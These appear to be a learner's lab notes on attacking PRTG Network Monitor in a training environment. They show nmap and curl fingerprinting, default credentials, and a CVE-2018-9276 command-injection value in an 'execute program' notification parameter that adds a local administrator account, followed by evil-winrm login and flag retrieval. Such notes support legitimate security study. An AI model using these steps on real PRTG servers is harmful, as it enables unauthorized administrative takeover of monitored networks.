# PRTG Network Monitor

PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.

It works with an autodiscovery mode to scan areas of a network and create a device list.

The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS.

It is rare to see PRTG exposed externally,

## Discovery/Footprinting/Enumeration

sudo nmap -sV -p- --open -T4 10.129.201.50

8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd

Here we can see that EyeWitness lists the default credentials :
prtgadmin:prtgadmin

http://10.129.201.50:8080/index.htm

curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>

Example of vulnerability which can be used :
https://nvd.nist.gov/vuln/detail/CVE-2018-9276

If default admin credentials failed, try other ones :
prtgadmin:Password123

## Leveraging Known Vulnerabilities

http://10.129.201.50:8080/myaccount.htm?tabid=2

Setup > Account Settings > Notifications > Add new notification

Tick the box next to EXECUTE PROGRAM

Demo exe notification - outfile.ps1
Parameter :
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add

Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up

Test
EXE notification is queued up

sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

## LAB

10.129.239.161

curl -s http://10.129.239.161:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=18.1.37.13946__" media="print,screen,projection" />
                Some functionalities may not work correctly or not at all. Consider upgrading to a modern browser version. We recommend <a href='https://www.google.com/chrome/'>Chrome</a> or <a href='http://www.mozilla.org/firefox/'>Firefox</a>.

http://10.129.239.161:8080/myaccount.htm?tabid=2

prtgadmin:Password123

Setup > Account Settings > Notifications > Add new notification

Tick the box next to EXECUTE PROGRAM

Demo exe notification - outfile.ps1
Parameter :
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add

Test

Other notification types:
EXE notification is queued up

sudo crackmapexec smb 10.129.239.161 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.239.161  445    APP03            [*] Windows 10.0 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.239.161  445    APP03            [-] APP03\prtgadm1:Pwn3d_by_PRTG! STATUS_LOGON_FAILURE 


evil-winrm -i 10.129.239.161 -u prtgadm1 -p Pwn3d_by_PRTG!
type c:\Users\Administrator\Desktop\flag.txt
WhOs3_m0nit0ring_wH0?